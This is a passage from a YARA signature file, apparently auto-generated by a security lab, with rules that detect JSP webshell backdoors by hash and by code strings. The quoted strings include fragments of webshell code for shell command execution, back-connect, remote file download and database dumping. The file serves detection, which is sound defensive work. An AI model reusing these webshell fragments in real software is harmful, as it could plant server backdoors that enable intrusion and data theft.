        hash44 = "efe0746ae5723f3b9e4d83bbe5f65a1526ea9b42abc85883afb67e64a3697129"
        hash45 = "64fbd3a67c6d02626cf130946a3bc5e8113a65ea66176006582a380b12d495d9"
        hash46 = "0e373739c55c3a79f033d10214ad88a700c7d3ee862d35bf71d0c36578454277"
        hash47 = "2424ea073fb98b85c26b9fd47bc8cfe5008504fd7ab80de428b75c296f3dd114"
        hash48 = "1cd6b614fd667f72bf9b6676522b3e6fac7056c4232f1dcaefff55e98655b1bf"
        hash49 = "8047492f47b2ad546190ad1dd18984916da0ac0b046dca46e1f5af315781d182"
        hash50 = "b9e52d41fa9d41dfaebad793ef99bda10c1f1c08fca43541b6d83c0e23cabddd"
        hash51 = "7fff522245c07cf0dc1a00f2650ff37b948337de5d93f58dca8825cea2de0442"
        hash52 = "a7fab64062972d0a6adb905d2b9aa3b193c48a4f951c6db370b1b809f25235f1"
        hash53 = "74168264a53223da64ade79b2083bfaf214fcf3d4a2853d74697d42af78165d0"
        hash54 = "c8b7d196856c0c5c0f4d6e6a0300f77dab19d5479bde6a757510af1ec410df6f"
    strings:
        $x1 = "<a href=\\\"javascript:doPost({o:'vs'});\\\">Execute Command</a> | \"+" fullword ascii
        $s2 = "<a href=\\\"javascript:doPost({o:'vd'});\\\">Download Remote File</a> | \"+" fullword ascii
        $s3 = "var savefilename = prompt('Input Target File Name(Only Support ZIP)','pack.zip');\"+" fullword ascii
        $s4 = "var name = prompt('Input Target File Name (Only Support Zip)',tmpName);\"+" fullword ascii
        $s5 = "<a href=\\\"javascript:doPost({o:'vbc'});\\\">Back Connect</a> | \"+" fullword ascii
        $s6 = "\"<a href=\\\"javascript:new fso({path:'\"+Util.convertPath(f.getAbsolutePath())+\"'}).down()\\\">Down</a> | \"+" fullword ascii
        $s7 = "\"<a href=\\\"javascript:new fso({path:'\"+Util.convertPath(f.getAbsolutePath())+\"'}).vEdit()\\\">Edit</a> | \"+" fullword ascii
        $s8 = "<td><a href=\\\"javascript:doPost({o:'logout'});\\\">Logout</a> | \"+" fullword ascii
        $s9 = "<a href=\\\"javascript:doPost({o:'vPortScan'});;\\\">Port Scan</a> | \"+" fullword ascii
        $s10 = "\"<h2>Execute Shell &raquo;</h2>\"+" fullword ascii
        $s11 = "out.println(\" | <a href=\\\"javascript:alert('Dont Support RAR,Please Use WINRAR');\\\">UnPack</a>\");" fullword ascii
        $s12 = "\"  <td width=\\\"20%\\\">Read/Write/Execute</td>\"+" fullword ascii
        $s13 = "JSession.setAttribute(\"done\",\"Back Connect Success!\");" fullword ascii
        $s14 = "<a href=\\\"javascript:doPost({o:'vmp'});\\\">Port Map</a> | \"+" fullword ascii
        $s15 = "\"  <td colspan=\\\"4\\\" align=\\\"right\\\">\"+dircount+\" directories / \"+filecount+\" files</td></tr>\"+" fullword ascii
        $s16 = "\"<h2>Remote File DownLoad &raquo;</h2>\"+" fullword ascii
        $s17 = "<a href=\\\"javascript:doPost({o:'vso'});\\\">Shell OnLine</a> | \"+" fullword ascii
        $s18 = "\"<h2>Execute Program &raquo;</h2>\"+" fullword ascii
        $s19 = "Util.outMsg(out,\"Download Remote File Success!\");" fullword ascii
        $s20 = "<a href=\\\"javascript:doPost({o:'vConn'});\\\">DataBase Manager</a> | \"+" fullword ascii
    condition:
        ( ( uint16(0) == 0xbbef or uint16(0) == 0x253c or uint16(0) == 0x6f43 ) and filesize < 400KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _bcb6d19990c7eba27f5667d3d35d3a4e8a563b88_bdaf9279b3d9e07e955d0ce706d9c42e4bdf9aa1_e52b7486b64bcc30087858e6ace4041c87dcc7f1_30
{
    meta:
        description = "jsp - from files bcb6d19990c7eba27f5667d3d35d3a4e8a563b88.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "3cae1bd3d766c1499b4689efd84bc45b12de8d6201041a029c71752c08429db3"
        hash2 = "488e17e55f6fd84cb138ad1350b7f3b2c5a8b82faf2e7903789d6d3c848f3883"
        hash3 = "de332d848f21bb342d5ebfdb351025e8705cd972a351fd88671a021a3bc0b893"
    strings:
        $x1 = "out.print(\"<td colspan=2>filepath:<input name=execFile size=75 type=text title='example d:\\\\cmd.exe /c dir c:'></td><td><inp" fullword ascii
        $x2 = "out.print(\"<td colspan=2>filepath:<input name=execFile size=75 type=text title='example d:\\\\cmd.exe /c dir c:'></td><td><inpu" ascii
        $x3 = "out.print(\"<td colspan=2>file:<input name=file type=file>up to file<input title='d:\\\\1.txt' name=UPaddress size=35 type=text" fullword ascii
        $s4 = "\"<form name=login method=post>username:<input name=LName type=text size=15><br>\" +" fullword ascii
        $s5 = "\"password:<input name=LPass type=password size=15><br><input type=submit value=Login></form></center>\");" fullword ascii
        $s6 = "if(request.getParameter(\"LName\")!=null&&request.getParameter(\"LPass\")!=null&&request.getParameter(\"LName\").equals(userna" fullword ascii
        $s7 = "me)&&request.getParameter(\"LPass\").equals(password)){" fullword ascii
        $s8 = "out.print(\"<td colspan=2>file:<input name=file type=file>up to file<input title='d:\\\\1.txt' name=UPaddress size=35 type=text>" ascii
        $s9 = "String boundary = request.getContentType().substring(30);//?????" fullword ascii
        $s10 = "out.print(\"</td><td width=60 align=center><a href='javascript:checkUrl();'>GOtoLink</a>\"); " fullword ascii
        $s11 = "//get the hostname and port" fullword ascii
        $s12 = "lspan=2>folder fullname:<input name=Filename type=text size=50></td><td><input name=submit type=submit value=new></td>\");" fullword ascii
        $s13 = "conUrl[3]=\"jdbc:oracle:thin:@host:port:database\";" fullword ascii
        $s14 = "2>file full name:<input name=Filename type=text size=50></td><td><input name=submit type=submit value=new></td>\");" fullword ascii
        $s15 = "//send user headhttp" fullword ascii
        $s16 = "if(request.getParameter(\"LName\")!=null&&request.getParameter(\"LPass\")!=null&&request.getParameter(\"LName\").equals(username" ascii
        $s17 = "//run the sql command" fullword ascii
        $s18 = "String chPh = initPath.substring(initPath.lastIndexOf(\"/\") + 1);// ?????" fullword ascii
        $s19 = "bos.write(buffer,0,line.getBytes().length);" fullword ascii
        $s20 = "out.println(\"<center style=font-size:12px><br><br>\"+APP_NAME+\"<br><br>\" +" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _73bb9a1933da055f3925d91c02b5dc4bd3c83a07_e9060aa2caf96be49e3b6f490d08b8a996c4b084_31
{
    meta:
        description = "jsp - from files 73bb9a1933da055f3925d91c02b5dc4bd3c83a07.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "0e95ba48ae2b3733262693faa266c4892a246c559b1714f6ac2a546df6e28864"
        hash2 = "e07d220168c3e33c79e2db81f4cfa04876ae74baacd13616dd7dfc1394052ebe"
    strings:
        $s1 = "String  url  =  \"http://\"  +  request.getServerName()  +  \":\"  +  request.getServerPort()  +  request.getContextPath()+r" fullword ascii
        $s2 = "out.println(\"<br><a href=./\"+request.getParameter(\"table\")+\"-\"+mark+\".txt>\"+request.getParameter" fullword ascii
        $s3 = "//String sql_dump=\"select rownom ro,* from T_SYS_USER\";" fullword ascii
        $s4 = "sql_dump+=\" from \"+request.getParameter(\"table\")+\" where rownum<=\";" fullword ascii
        $s5 = "rs_dump= stmt_dump.executeQuery(dump);" fullword ascii
        $s6 = "String filename = request.getRealPath(request.getParameter(\"table\")+\"-\"+mark+\".txt\");" fullword ascii
        $s7 = "out.print(\" target=_blank>\");out.print(rs.getString(1));out.print(\"</a><br>\");" fullword ascii
        $s8 = "rs_columns_count=stmt_columns_count.executeQuery(sql_columns_count); " fullword ascii
        $s9 = "Statement stmt_dump=conn.createStatement(ResultSet.TYPE_SCROLL_SENSITIVE,ResultSet.CONCUR_UPDATA" fullword ascii
        $s10 = "Statement stmt_dump=conn.createStatement(ResultSet.TYPE_SCROLL_SENSITIVE,ResultSet.CONCUR_UPDATABLE);" fullword ascii
        $s11 = "String sql_column=\"select * from all_tab_columns where Table_Name='\"+request.getParameter(\"table\")+\"'\";" fullword ascii
        $s12 = "Connection conn=DriverManager.getConnection(oraUrl,oraUser,oraPWD);" fullword ascii
        $s13 = "rs=stmt.executeQuery(\"select table_name from all_tables\");" fullword ascii
        $s14 = "rs_column=stmt_column.executeQuery(sql_column); " fullword ascii
        $s15 = "pw.print(rs_dump.getString(column_num));" fullword ascii
        $s16 = "sql_dump+=rs_column.getString(3);" fullword ascii
        $s17 = "out.print(\"<a href=\");out.print(url);out.print(\"?table=\");out.print(rs.getString(1));" fullword ascii
        $s18 = "<meta http-equiv=\"keywords\" content=\"keyword1,keyword2,keyword3\">" fullword ascii
        $s19 = "String sql_count=\"select count(*) from all_tab_columns where Table_Name='\"+request.getParameter(\"table\")+\"'\";" fullword ascii
        $s20 = "<meta http-equiv=\"description\" content=\"This is my page\">" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 30KB and ( 8 of them ) ) or ( all of them )
}

rule _7fe11e5f98e9945d0b0790d511b24e740ce5d596_c1efcbdb38003f4b4d11b022b69ecdbad90025a6_32
{
    meta:
        description = "jsp - from files 7fe11e5f98e9945d0b0790d511b24e740ce5d596.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "7439d1c0b9994b74db771d9568e3b845630e3497aab71f12cc3af954e7522e45"
        hash2 = "dda9e7e898e8f973a0a16c576789337caf7da2f9303936de5b062e98966e50a0"
    strings:
        $s1 = "public String getBoundary(HttpServletRequest request,Properties prop) throws ServletException,IOException{" fullword ascii
        $s2 = "Long contentsize = new Long(prop.getProperty(\"content-length\",\"0\"));" fullword ascii
        $s3 = "out.println(\"FileName: \" + newfile.getName());" fullword ascii
        $s4 = "long l = contentsize.longValue() - ROUGHSIZE; " fullword ascii
        $s5 = "<form name=\"test\" method=\"post\" action=\"\" enctype=\"multipart/form-data\">" fullword ascii
        $s6 = "out.println(\"FileSize: \" + newfile.length());" fullword ascii
        $s7 = "ServletInputStream fin =  request.getInputStream();" fullword ascii
        $s8 = "if(\"content-type\".equalsIgnoreCase(header) ){" fullword ascii
        $s9 = "boundary = prop.getProperty(\"boundary\"); " fullword ascii
        $s10 = "public String getFileName(String secondline){" fullword ascii
        $s11 = "String tboundary = st.getBuffer().toString();" fullword ascii
        $s12 = "String hvalue = request.getHeader(header);" fullword ascii
        $s13 = "String boundary = getBoundary(request,prop);" fullword ascii
        $s14 = "String header = (String)enum.nextElement();" fullword ascii
        $s15 = "String secondline = st.getBuffer().toString();" fullword ascii
        $s16 = "while((c = fin.read()) != -1){" fullword ascii
        $s17 = "Enumeration enum = request.getHeaderNames();" fullword ascii
        $s18 = "<%@ page import=\"java.io.*,java.util.*,javax.servlet.*\" %>" fullword ascii
        $s19 = "while((c=fin.read()) != -1 ){" fullword ascii
        $s20 = "int ROUGHSIZE = 640000; // BUG: Corta el fichero si es mayor de 640Ks" fullword ascii
    condition:
        ( uint16(0) == 0x6a3c and filesize < 10KB and ( 8 of them ) ) or ( all of them )
}

rule _2d0a76576f13c70a3d1a0d8d4e7453382adefdbc_30cf4dccf67c46a6f100818d4d4141c0150b1281_3b05dd031fdbebfa79614b0035c47052ac60b210__33
{
    meta:
        description = "jsp - from files 2d0a76576f13c70a3d1a0d8d4e7453382adefdbc.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "4bfe0d96c929ca04283f61b88dc2382fa4f5f6ea5735f0c3d3900c590e98bda6"
        hash2 = "089c2df0356824595c6a14851a1f28bae4482a0cb9bc5864404c986749e64040"
        hash3 = "f4a0353cab22847ddfe6a2f875cb941e5e4dd78c3eadc33d0bc9f2a38bccf606"
        hash4 = "3b739d9941f980a231d1156dbaf2d17e513cec8864b1825755a179bf2b0aad1d"
        hash5 = "e129288b96ead689b7571a04c6db69e4be345d8532923d6f85194b6c87ad2166"
        hash6 = "8db4b99711e38a16567f0cbcde2ae568b68c33324649f09fb85714f717a684cf"
        hash7 = "35c8c39aaf8e0b14e53459d2203705cde46e56a3464c57f7a400448d86c3e45e"
        hash8 = "6b4e479af8f1890e3d56bdf85186f380ba971d4ddc2ca261d076597f290e1456"
        hash9 = "c8ef23e6759e2dd84f28fc1ec5ae913b35c8efb05dd6aa2951aed9fe867553a1"
        hash10 = "322807a2af30c73616c67862e736796f59efe1508ee0fe6ddb1e04f10ef72c06"
    strings:
        $s1 = "sb.append(\"Execute Successfully!\\t|\\t\\r\\n\");" fullword ascii
        $s2 = "m.executeUpdate(q);" fullword ascii
        $s3 = "HH(s + \"/\" + z[j].getName(), d + \"/\" + z[j].getName());" fullword ascii
        $s4 = "sb.append(r.getString(\"TABLE_NAME\") + \"\\t\");" fullword ascii
        $s5 = "sb.append(d.getColumnName(i) + \"\\t|\\t\");" fullword ascii
        $s6 = "os.write((\"->\" + \"|\").getBytes(), 0, 3);" fullword ascii
        $s7 = "os.write((\"|\" + \"<-\").getBytes(), 0, 3);" fullword ascii
        $s8 = "sb.append(r.getString(1) + \"\\t\");" fullword ascii
        $s9 = "sb.append(\"ERROR\" + \":// \" + e.toString());" fullword ascii
        $s10 = "java.util.Date dt = fm.parse(t);" fullword ascii
        $s11 = "MM(p.getErrorStream(), sb);" fullword ascii
        $s12 = "for (int i = 1; i <= d.getColumnCount(); i++) {" fullword ascii
        $s13 = "sb.append(ee.toString() + \"\\t|\\t\\r\\n\");" fullword ascii
        $s14 = "BufferedInputStream is = new BufferedInputStream(new FileInputStream(s));" fullword ascii
        $s15 = "int n = d.getColumnCount();" fullword ascii
        $s16 = "MM(p.getInputStream(), sb);" fullword ascii
        $s17 = "sb.append(\"|\" + \"<-\");" fullword ascii
        $s18 = "sb.append(\"->\" + \"|\");" fullword ascii
        $s19 = "String[] c = { z1.substring(2), z1.substring(0, 2), z2 };" fullword ascii
        $s20 = "EE(x[k].getPath());" fullword ascii
    condition:
        ( ( uint16(0) == 0x253c or uint16(0) == 0x6854 ) and filesize < 30KB and ( 8 of them ) ) or ( all of them )
}

rule _28f0cad6197cce10791a400a28f611b8400a8aec_37ca8aec7ed07d8c6bdcfb2b97416745f7870f7e_68fe4d31b82f416fb2d3a32f1cc179060096e8a5__34
{
    meta:
        description = "jsp - from files 28f0cad6197cce10791a400a28f611b8400a8aec.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "3b2498fbdba4ba0afa07db58bc7635bd32e6c89a5ce71a1e39941099b2d24247"
        hash2 = "11c6a21978abede258a86656ea665773ff5d126975a2389d6514a3f7f25507c1"
        hash3 = "b798b2eef87755b26b30e4d3483582adcc7d0a20d87cb78c8a9cd5c7a32d7730"
        hash4 = "c61303ebaa7234acd2aea6c5a7cb076c918938f2ace2a966d2dbe4382e766de0"
        hash5 = "7d0aedc6999a16e814f43f63617d4fbff0dc6c70ba4b67b2dd72ca00ad9099e1"
        hash6 = "ad54cd37b150597ec7032b391507addfb6b871711e5cbf28ccb213dd1855ef5c"
        hash7 = "a4306b23c0f066dbfbfc5a06d07b58081dd618fd5c95ec795cd3b8085bc80bd6"
        hash8 = "5473f1edd8d2c8c37648cf0c64d805741f1cd867eeceb21850570d74851f0d78"
    strings:
        $s1 = "<td><a title=\\\"\" + files[n].getName() + \"\\\">\" + strCut(files[n].getName(), 50) + \"</a></td>\\n\";" fullword ascii
        $s2 = "document.fileList.action = \\\"\" + curUri + \"&curPath=\" + path + \"&fsAction=copyto&dstPath=\" + \"\\\" + toPath;\\n\";" fullword ascii
        $s3 = "ut(files[n].getName(), 50) + \"&gt;</a></td>\\n\";" fullword ascii
        $s4 = "ert(files[n].getPath()) + \"</a></td>\\n\";" fullword ascii
        $s5 = "<td width=\\\"15%\\\" align=\\\"center\\\">\" + files[n].length() + \"</td>\\n\";" fullword ascii
        $s6 = "document.dbInfo.sql.value = \\\"\\\";\";" fullword ascii
        $s7 = "<textarea name=\\\"fileContent\\\" cols=\\\"80\\\" rows=\\\"32\\\">\\n\";" fullword ascii
        $s8 = "sRet += \"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + curUri + \"&curPath=\" + path + \"&fsAction=open\" + \"\\\" />" ascii
        $s9 = "document.openfile.action=\\\"\" + curUri + \"&curPath=\" + pathConvert(curFile.getParent()) + \"\\\" + fileName + \\\"&fsAction=" ascii
        $s10 = "document.openfile.action=\\\"\" + curUri + \"&curPath=\" + pathConvert(curFile.getParent()) + \"\\\" + fileName + \\\"&fsAction=" ascii
        $s11 = "<form enctype=\\\"multipart/form-data\\\" method=\\\"post\\\" name=\\\"upload\\\" action=\\\"\" + curUri + \"&curPath=\" + path " ascii
        $s12 = "<form enctype=\\\"multipart/form-data\\\" method=\\\"post\\\" name=\\\"upload\\\" action=\\\"\" + curUri + \"&curPath=\" + path " ascii
        $s13 = "\\\">edit</a>>\" : \"\") + \"</td>\\n\";" fullword ascii
        $s14 = "selectedFile.style.backgroundColor = \\\"#FFFFFF\\\";\\n\";" fullword ascii
        $s15 = "if (folderName != null && folderName != false && ltrim(folderName) != \\\"\\\") {\\n\";" fullword ascii
        $s16 = "if (fileName != null && fileName != false && ltrim(fileName) != \\\"\\\") {\\n\";" fullword ascii
        $s17 = "<td width=\\\"5%\\\" align=\\\"center\\\"><input type=\\\"checkbox\\\" name=\\\"filesDelete\\\" value=\\\"\" + pathConvert(files" ascii
        $s18 = "<td width=\\\"5%\\\" align=\\\"center\\\"><input type=\\\"checkbox\\\" name=\\\"filesDelete\\\" value=\\\"\" + pathConvert(files" ascii
        $s19 = "obj.style.backgroundColor = \\\"#CCCCCC\\\";\\n\";" fullword ascii
        $s20 = "obj.style.backgroundColor = \\\"#FFFFFF\\\";\\n\";" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 8 of them ) ) or ( all of them )
}

rule _275da720a99ed21fd98953f9ddda7460e5b96e5f_51a25a3ec9633d02d856e910b3c48f8771d960aa_6121bd4faf3aa1f13ac99df8f6030041ca9d3cc3_35
{
    meta:
        description = "jsp - from files 275da720a99ed21fd98953f9ddda7460e5b96e5f.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "dc34856d6d9427af27e8e4369a3a3a333b90adc51482f8c497a1df8aa1e26e09"
        hash2 = "235734c9bcff91f33a8430859299bd30489bf8865279f81571c571b9797d070f"
        hash3 = "ea0d67b44f2a604603176606bd47cb55845bf29b191564958ce9b9d2a33c63b9"
    strings:
        $s1 = "sRet += \"  <td><a title=\\\"\" + files[n].getName() + \"\\\">\" + strCut(files[n].getName(), 50) + \"</a></td>\\n\";" fullword ascii
        $s2 = "sRet += \"  <td>[<a href=\\\"\" + curUri + \"&curPath=\" + pathConvert(curFile.getParent()) + \"\\\">" fullword ascii
        $s3 = "\"\\\">&lt;\" + strCut(files[n].getName(), 50) + \"&gt;</a></td>\\n\";" fullword ascii
        $s4 = "result += \"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + request.getRequestURI() + \"?action=\" + request.getParamete" ascii
        $s5 = "\"\\\">\" + pathConvert(files[n].getPath()) + \"</a></td>\\n\";" fullword ascii
        $s6 = "<form name=\"config\" method=\"post\" action=\"<%=request.getRequestURI() + \"?action=config&cfAction=save\"%>\" onSubmit=\"java" ascii
        $s7 = "sRet += \"  <td width=\\\"15%\\\" align=\\\"center\\\">\" + files[n].length() + \"</td>\\n\";" fullword ascii
        $s8 = "_url = \"jdbc:microsoft:sqlserver://\" + dbServer + \":\" + dbPort + \";User=\" + dbUsername + \";Password=\" + dbPassword + \";" ascii
        $s9 = "_url = \"jdbc:mysql://\" + dbServer + \":\" + dbPort + \";User=\" + dbUsername + \";Password=\" + dbPassword + \";DatabaseName=" ascii
        $s10 = "if (request.getParameter(\"command\") != null) {  " fullword ascii
        $s11 = ".getPath()) + \"\\\" /></td>\\n\";" fullword ascii
        $s12 = "=\\\" + document.fileList.filesDelete[selected].value;\";" fullword ascii
        $s13 = "Action=open\" + \"\\\">edit</a>>\" : \"\") + \"</td>\\n\";" fullword ascii
        $s14 = "<td align=\"center\" class=\"datarows\"><%=System.getProperty(\"java.compiler\") == null ? \"\" : System.getProperty(\"java.comp" ascii
        $s15 = "<td align=\"center\" class=\"datarows\"><%=System.getProperty(\"os.name\") + \" \" + System.getProperty(\"os.version\") + \" \" " ascii
        $s16 = "sRet += \" <form enctype=\\\"multipart/form-data\\\" method=\\\"post\\\" name=\\\"upload\\\" action=\\\"\" + curUri + \"&curPath" ascii
        $s17 = "sRet += \"  if (newName != null && newName != false && ltrim(newName) != \\\"\\\") {\\n\";" fullword ascii
        $s18 = "sRet += \"   <textarea name=\\\"fileContent\\\" cols=\\\"80\\\" rows=\\\"32\\\">\\n\";" fullword ascii
        $s19 = "fsAction=upload\" + \"\\\">\\n\";" fullword ascii
        $s20 = "sRet += \"  <td width=\\\"5%\\\" align=\\\"center\\\"><input type=\\\"checkbox\\\" name=\\\"filesDelete\\\" value=\\\"\" + pathC" ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 8 of them ) ) or ( all of them )
}

rule _1e79cae19d42da5aa9813b16456971b4e3d34ac0_6cf0f458ae8faaabc449509d69531450b2067f3b_b0bf32a5535c8815eff7429338d0111f2eef41ae__36
{
    meta:
        description = "jsp - from files 1e79cae19d42da5aa9813b16456971b4e3d34ac0.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "ae77377b007733bb984ccf751ba2ba26a5befc293a2266ca00d7e53125299947"
        hash2 = "43155417ae71646a6caa1151c865fd26c2ac8f333aa155123310e252c23f8827"
        hash3 = "647e68c60293582c59b2e0c6fc8ee672293c731fbbda760dc2ab8ee767019e58"
        hash4 = "f13923c9a06e8526027e2ebf7f854dbee729b259f35e8c3813d6916a171044d4"
        hash5 = "3cae1bd3d766c1499b4689efd84bc45b12de8d6201041a029c71752c08429db3"
        hash6 = "488e17e55f6fd84cb138ad1350b7f3b2c5a8b82faf2e7903789d6d3c848f3883"
        hash7 = "0238225b83d37cc1259f83798f35b547a19179eb247beb9087d589bea7832f11"
        hash8 = "de332d848f21bb342d5ebfdb351025e8705cd972a351fd88671a021a3bc0b893"
    strings:
        $s1 = "out.print(\"<form name=address method=post target=FileFrame onSubmit='checkUrl();'>\");" fullword ascii
        $s2 = "document.write(\"filename:<input name='Filename' type='text' size=60 readonly value='\"+file+\"'><br>\");" fullword ascii
        $s3 = "while ((len = input.read(buffer, 0, bufferLen)) != -1) {" fullword ascii
        $s4 = "zipEntry(zipOs, initPath, filePath + File.separator + files[i],zipPath);" fullword ascii
        $s5 = "return new String(str.getBytes(\"ISO-8859-1\"),\"gb2312\");" fullword ascii
        $s6 = "void zipEntry(ZipOutputStream zipOs, String initPath,String filePath,String zipPath) throws Exception {" fullword ascii
        $s7 = "calendar.set(Integer.parseInt(year),Integer.parseInt(month),Integer.parseInt(day));" fullword ascii
        $s8 = "out.print(\"<tr><td width=60 align=center>FilePath:</td><td>\");" fullword ascii
        $s9 = "out.print(filename+\"file date change error\");" fullword ascii
        $s10 = "out.print(\"<table width=100% height=100% border=0 bgcolor=menu>\");" fullword ascii
        $s11 = "out.print(\"</td></tr></form></table></td></tr><tr><td width=148>\");" fullword ascii
        $s12 = "entry.setCrc(crc.getValue());" fullword ascii
        $s13 = "document.write(\"<input name='cancel' onclick='history.back();' type='button' value='Cancel'>\");" fullword ascii
        $s14 = "document.write(\"<option value=\"+i+\">\"+i+\"</option>\");" fullword ascii
        $s15 = "if(ff.getAbsolutePath().equals(zipPath))return;" fullword ascii
        $s16 = "out.print(\"file zip error\");" fullword ascii
        $s17 = "document.write(\"Month:<select name='month'>\");" fullword ascii
        $s18 = "out.print(\"<table width=100% height=25 border=0>\");" fullword ascii
        $s19 = "out.print(\"<tr><td height=30 colspan=2>\");" fullword ascii
        $s20 = "document.write(\"Year:<select name='year'>\");" fullword ascii
    condition:
        ( ( uint16(0) == 0x253c or uint16(0) == 0x213c ) and filesize < 100KB and ( 8 of them ) ) or ( all of them )
}

rule _198577337426540c3f9ed6947bed89219774379f_20614d368b77c3af8dbc61e0bbe472e73fde40b3_22daf8a156bfb57697e03b4b16f09a743764a3f6__37
{
    meta:
        description = "jsp - from files 198577337426540c3f9ed6947bed89219774379f.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "f7189627975054f5a9b51e103b7a4771971e178e865ddf29445bd104e0f121fe"
        hash2 = "3a2e25273b81e4407650df8fffb4bc33af553b0e3234ff7b55232f94b37ec6be"
        hash3 = "0dbc21d0e98041b57fb1f5cbcea35bb00c72c883d4326febb1199c866fa75749"
        hash4 = "27127178ffdadbfe6cc39c4df3130b3f029f22ed14e721f8f89614e1427a46fd"
        hash5 = "565c4c6aafcd1e1d4a98db793e8122302713c5944efbf96f56a861399746400b"
        hash6 = "4a6736d3e652b01fe3953f3b49b394448cbe5c49106ee9638a33d4320eb26580"
        hash7 = "8947bcb8e9b46559b7844800b82792bcb1ebcb3e7bb5f73a620fb0154f6d46f6"
        hash8 = "6a844c3cafbf8f2427cf90ce28a27242b1710d2cfb37b8181ce5f9fc3a7a2cdb"
        hash9 = "ddf0b2fb4c9c4799d86a7fd3860f94ba26b4c47084f283b4b84309bdb4f618b7"
        hash10 = "7630bd7c4a9dde3b522ec224373edc1a90b6e926ff97e2b56d5dbc6eb78b25ed"
        hash11 = "45be2bd8db15a97e482f2fe0b36e1e1b44ba9ce34929f5755cedeafbff6360b2"
        hash12 = "37132d9bd0c29634e01cd9a951ef5d09dac1755814e4c55eb22f58a3e47e2719"
        hash13 = "f9eb64c48791e1ee5226c6ef0e733b75240721a099fff860c7e2f28e5191c906"
        hash14 = "a5b30ad841ac37b37d34a25036457f80b21692a77ede840c082a7121755a426d"
        hash15 = "c12ac5375b9ca777e66072d9498a8114725c45d3e02c5ba173f451039d650b1e"
        hash16 = "81d326f91848ee3eb808f9040163966b05aafb68eb2834d067ce7eea9d8ed3eb"
        hash17 = "79b827d25ac28bec5256f09dcfebfcd66960e6953a0d6157a9413f980e6ff38f"
        hash18 = "b6adbab6e44d1c337039a22dfe50446186d8e6568736660ab0b5ac1de03593fa"
        hash19 = "ed1865648ef630800ad30a4a46d6311dbd00c2f3ca5c137b1b8c6633ba0e6c01"
        hash20 = "64e69b73c3ed42bf910b85c22cbb7a1c8ce5db7f64ff7427362e6c6e740dbe1a"
        hash21 = "eee89cb4f99bdf4a3cbb4a460bf36a7919f4dfc4f01a80231eb21d4255d3762c"
        hash22 = "92accc8fb3ce28eb33bfc47703ac89c2a369c6f7c1dc80e8d30e00ee538ca436"
    strings:
        $x1 = "else if(Z.equals(\"M\")){String[] c={z1.substring(2),z1.substring(0,2),z2};Process p=Runtime.getRuntime().exec(c);" fullword ascii
        $s2 = "catch(Exception e){sb.append(\"Result\\t|\\t\\r\\n\");try{m.executeUpdate(q);sb.append(\"Execute Successfully!\\t|\\t\\r\\n\");" fullword ascii
        $s3 = "Connection c=DriverManager.getConnection(x[1].trim());if(x.length>2){c.setCatalog(x[2].trim());}return c;}" fullword ascii
        $s4 = "HttpURLConnection h=(HttpURLConnection)u.openConnection();InputStream is=h.getInputStream();byte[] b=new byte[512];" fullword ascii
        $s5 = "Statement m=c.createStatement(1005,1007);ResultSet r=m.executeQuery(\"select * from \"+x[3]);ResultSetMetaData d=r.getMetaData()" ascii
        $s6 = "MM(p.getInputStream(),sb);MM(p.getErrorStream(),sb);}else if(Z.equals(\"N\")){NN(z1,sb);}else if(Z.equals(\"O\")){OO(z1,sb);}" fullword ascii
        $s7 = "void NN(String s,StringBuffer sb)throws Exception{Connection c=GC(s);ResultSet r=c.getMetaData().getCatalogs();" fullword ascii
        $s8 = "try{ResultSet r=m.executeQuery(q);ResultSetMetaData d=r.getMetaData();int n=d.getColumnCount();for(i=1;i<=n;i++){sb.append(d.get" ascii
        $s9 = "java.util.Date dt=fm.parse(t);f.setLastModified(dt.getTime());}" fullword ascii
        $s10 = "ServletOutputStream os=r.getOutputStream();BufferedInputStream is=new BufferedInputStream(new FileInputStream(s));" fullword ascii
        $s11 = "try{ResultSet r=m.executeQuery(q);ResultSetMetaData d=r.getMetaData();int n=d.getColumnCount();for(i=1;i<=n;i++){sb.append(d.get" ascii
        $s12 = "for(int k=0;k<x.length;k++){if(!x[k].delete()){EE(x[k].getPath());}}}f.delete();}" fullword ascii
        $s13 = "int n;byte[] b=new byte[512];while((n=is.read(b,0,512))!=-1){os.write(b,0,n);}is.close();os.close();}}" fullword ascii
        $s14 = "{os.write((h.indexOf(d.charAt(i))<<4|h.indexOf(d.charAt(i+1))));}os.close();}" fullword ascii
        $s15 = "void GG(String s, String d)throws Exception{String h=\"0123456789ABCDEF\";int n;File f=new File(s);f.createNewFile();" fullword ascii
        $s16 = "while(r.next()){sb.append(r.getString(1)+\"\\t\");}r.close();c.close();}" fullword ascii
        $s17 = "void FF(String s,HttpServletResponse r)throws Exception{int n;byte[] b=new byte[512];r.reset();" fullword ascii
        $s18 = "for(int j=0;j<z.length;j++){HH(s+\"/\"+z[j].getName(),d+\"/\"+z[j].getName());}" fullword ascii
        $s19 = "void LL(String s, String d)throws Exception{URL u=new URL(s);int n;FileOutputStream os=new FileOutputStream(d);" fullword ascii
        $s20 = "while((n=is.read(b,0,512))!=-1){os.write(b,0,n);}os.close();is.close();h.disconnect();}" fullword ascii
    condition:
